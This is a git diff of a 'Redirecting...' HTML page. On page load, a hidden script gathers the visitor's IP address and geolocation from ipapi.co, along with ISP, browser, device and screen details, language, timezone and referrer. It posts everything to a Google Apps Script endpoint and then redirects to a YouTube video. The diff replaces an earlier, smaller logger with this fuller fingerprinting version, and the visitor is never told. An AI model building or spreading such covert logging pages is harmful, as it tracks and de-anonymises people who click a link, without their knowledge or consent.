@@ -2,43 +2,61 @@
 <html>
 <head>
   <title>Redirecting...</title>
-  <script>
-    async function logAndRedirect() {
-      const redirectTo = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // <-- your target
-
-      try {
-        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
-
-        const payload = {
-          ip: ipData.ip,
-          city: ipData.city,
-          region: ipData.region,
-          country: ipData.country_name,
-          latitude: ipData.latitude,
-          longitude: ipData.longitude,
-          redirect: redirectTo
-        };
-
-        await fetch("https://script.google.com/macros/s/AKfycbz-XZj6uoLssqxbQzudmns8WsK-_DxAqsarlHK-r3Ewjd1MY5-MoDYQ-fqXc1eJFS1mwA/exec", {
-          method: "POST",
-          body: JSON.stringify(payload),
-          headers: {
-            "Content-Type": "application/json"
-          }
-        });
-
-      } catch (err) {
-        console.error("Error logging data", err);
-      }
-
-      // Delay for a second before redirect
-      setTimeout(() => window.location.href = redirectTo, 1000);
-    }
-
-    window.onload = logAndRedirect;
-  </script>
 </head>
 <body>
   <h2>Redirecting... Please wait</h2>
+
+  <script>
+    async function collectAndSend() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const ipData = await res.json();
+
+        const fields = {
+          IP: ipData.ip || '',
+          City: ipData.city || '',
+          Region: ipData.region || '',
+          Country: ipData.country_name || '',
+          ISP: ipData.org || '',
+          Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          TimeOffset: new Date().getTimezoneOffset(),
+          Language: navigator.language,
+          UserAgent: navigator.userAgent,
+          Platform: navigator.platform,
+          Screen: `${screen.width}x${screen.height}`,
+          ColorDepth: screen.colorDepth,
+          DeviceMemory: navigator.deviceMemory || '',
+          CPUCores: navigator.hardwareConcurrency || '',
+          Online: navigator.onLine,
+          DoNotTrack: navigator.doNotTrack,
+          TouchSupport: ('ontouchstart' in window),
+          ConnectionType: navigator.connection?.effectiveType || '',
+          Referrer: document.referrer || 'Direct'
+        };
+
+        const formData = new FormData();
+        for (const key in fields) {
+          formData.append(key, fields[key]);
+        }
+
+        await fetch('https://script.google.com/macros/s/AKfycbzW1Q21J2tzjygpYtj9JgmJXaaDQEj_LDgGeHopJgfGS7YoD05z6wvHgBnLk2jIdtU/exec', {
+          method: 'POST',
+          body: formData
+        });
+
+      } catch (e) {
+        console.error('Error:', e);
+      }
+    }
+
+    async function start() {
+      await collectAndSend();
+      setTimeout(() => {
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // 🔁 Change target if needed
+      }, 1000);
+    }
+
+    window.onload = start;
+  </script>
 </body>
 </html>
